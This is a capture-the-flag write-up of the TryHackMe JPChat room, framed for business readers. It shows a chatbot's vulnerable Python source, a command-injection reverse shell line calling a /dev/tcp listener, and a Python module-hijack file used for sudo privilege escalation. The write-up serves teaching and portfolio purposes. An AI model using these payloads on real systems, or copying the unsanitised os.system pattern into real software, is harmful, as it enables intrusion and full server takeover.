<h1>Penetration Test Write-Up: JPChat (TryHackMe)</h1>

<h2>Description</h2>

Room: JPChat (TryHackMe)
<br />
Difficulty: Easy
<br />
Objective: Exploit a poorly coded chatbot to achieve remote code execution and escalate to root.
<br />
Business Context: The vulnerabilities demonstrated mirror those commonly introduced by AI-generated code deployed without human review.
<br />

<h2>Executive Summary</h2>

A simulated customer service chatbot—representative of the type increasingly built using AI code generation tools—was assessed for security vulnerabilities. Two critical findings were identified.
<br />
<br />
First, the chatbot's report function contained an OS command injection flaw that allowed unauthenticated remote code execution. This granted an attacker a foothold on the server without needing any credentials. Second, a misconfigured sudo permission allowed a low-privileged user to escalate to root by hijacking a Python library import.
<br />
<br />
The combined attack chain enabled full server compromise from an unauthenticated starting point. If this were a production system, an attacker could access all customer data, modify or deface the website, install malware, or use the server to attack other businesses.

<h2>What This Means for Your Business</h2>

AI writes functional code, but it does not write secure code.
When a developer uses tools like ChatGPT or Copilot to build a feature quickly, the code often works perfectly, but contains mistakes that a human reviewer would catch. The vulnerability exploited here is a textbook example of what AI assistants consistently get wrong.
<br />
<br />
This was just a chatbot I exploited, not the payment system or the admin panel. Any service accessible from the internet is an attack surface, meaning a single vulnerable feature on your website can be the entry point for a full compromise.
<br />
<br />
One small mistake can give an attacker everything.
The initial vulnerability gave us a restricted shell on the server. A second, completely unrelated misconfiguration let us become the system administrator. Attackers chain small weaknesses together. Defence in depth is the only real protection.
<br />
<br />
You don't need to be a target to be a victim.
Automated bots scan the internet constantly, looking for exactly these vulnerabilities. Nobody specifically targeted this system. A generic exploit worked against a generic mistake. If your business has a website, it is being scanned right now.

<h2>Technical Walkthrough:</h2>
<p align="center">

<h3>Enumeration</h3>
 
I started off with an nmap scan on the target IP address, which revealed 2 open ports:
 <br/>
-22
 <br/>
-3000
<br />
<img src="https://i.imgur.com/jKtiFMe.png" alt="nmap_scan_results"/>
<br /> <br />

Upon visiting the service on port 3000, the webpage displayed the following:
<br />
<img src="https://i.imgur.com/GLEtO76.png" alt="port3000"/>
<br /> <br />

Let's use NetCat to connect to the service and see what we can find.
<br />
<img src="https://i.imgur.com/p9YfRag.png" alt="netcat_displayport3000"/>
<br />
As we can see, both [MESSAGE] and [REPORT] functions are available to us. After using the [REPORT} function, it leaks the name ‘Mozzie-jpg’, which we can assume is the admin name.
<br /> <br />

Using the admin name leaked to us earlier, I managed to find the source code for the chatbot on GitHub:
<br />
<img src="https://i.imgur.com/k6VPvmf.png" alt="port3000"/>
<br />
```python
#!/usr/bin/env python3

import os

print ('Welcome to JPChat')
print ('the source code of this service can be found at our admin\'s github')

def report_form():

	print ('this report will be read by Mozzie-jpg')
	your_name = input('your name:\n')
	report_text = input('your report:\n')
	os.system("bash -c 'echo %s > /opt/jpchat/logs/report.txt'" % your_name)
	os.system("bash -c 'echo %s >> /opt/jpchat/logs/report.txt'" % report_text)

def chatting_service():

	print ('MESSAGE USAGE: use [MESSAGE] to message the (currently) only channel')
	print ('REPORT USAGE: use [REPORT] to report someone to the admins (with proof)')
	message = input('')

	if message == '[REPORT]':
		report_form()
	if message == '[MESSAGE]':
		print ('There are currently 0 other users logged in')
		while True:
			message2 = input('[MESSAGE]: ')
			if message2 == '[REPORT]':
				report_form()

chatting_service()
```
After inspecting the source code, these two lines of code stood out to me:
```python
	os.system("bash -c 'echo %s > /opt/jpchat/logs/report.txt'" % your_name)
	os.system("bash -c 'echo %s >> /opt/jpchat/logs/report.txt'" % report_text)
```
-The code takes user input from `your_name` and `report_text`
<br />
-Inserts that input directly into a bash command string
<br />
-Runs that string as a system command
<br />
<br />
There is no input sanitation, so we can input whatever we want and it will go undetected by the chatbot. This means we can create a reverse shell to grant us unauthorised access to the server hosting the chatbot.
```bash
; bash -i >& /dev/tcp/MACHINE_IP/LISTENING_PORT 0>&1;
```
<br /> <br />

<h3>Exploitation (Reverse Shell Execution via OS Command Injection</h3>

To successfully execute the reverse shell, I'll need two terminals open: one for using Netcat to start a listener on the Target IP, and another for interacting with the chatbot.
<br />
<img src="https://i.imgur.com/P7nPda0.png" alt="netcat_listener"/>
<br /> <br />

I connected to the chat service, started the [REPORT] function, and entered the reverse shell payload.
<br />
<img src="https://i.imgur.com/pyzm8a5.png" alt="chat"/>
<br /> <br />

This was the final output across both terminals, where we successfully initiated a reverse shell:
<br />
<img src="https://i.imgur.com/5Y91J9n.png" alt="chat"/>
<br /> <br />

Before we navigate through the server, we need to stabilise the shell payload to ensure maximum efficiency. This is because the shell isn't attached to a proper terminal, meaning we don't have access to commands like ```nano``` (which we will need later on for privilege escalation).
<br />
<img src="https://i.imgur.com/1NSuoXE.png" alt="shell_stabilisation"/>
<br /> <br />

<h3>Privilege Escalation</h3>

Now that I have unauthorised access to the server, my aim is to have full control of the server by obtaining root access. The first command I'm going to run is ```sudo -l``` to see what the user is allowed to run as an administrator.
<br />
<img src="https://i.imgur.com/oJdDyhi.png"/>
<br /> <br />

We’ve been told we can run ```/opt/development/test_module.py``` as root. Running this module outputs the following:
<br />
<img src="https://i.imgur.com/z9ADocA.png"/>
<br /> <br />

We can do our privilege escalation using python module hijacking as this script imports a library called compare to run. This means we can simply write a dummy ```compare.py``` in the directory the python module is stored in with code to spawn a new shell. Also, we will point the ```PYTHONPATH``` to ```/home/wes``` , as ```sudo -l``` shows us that the environment variable will be kept.
<br /> <br />

Let's create a dummy module of ```compare.py``` by creating a python module that contains the following code:
```python
import os
os.system("/bin/bash")
```
<br /> <br />

From running the following command we're given root access, meaning we can now takeover the server hosting the chatbot.
<br />
<img src="https://i.imgur.com/ze5RG0O.png"/>

<h2>Disclaimer</h2>

This penetration test was performed against a deliberately vulnerable training environment (TryHackMe, JPChat room). All findings and exploitation were conducted in a controlled, authorised setting. No real systems were targeted, and no unauthorised access was attempted. The real-world framing is for educational and portfolio demonstration purposes only.
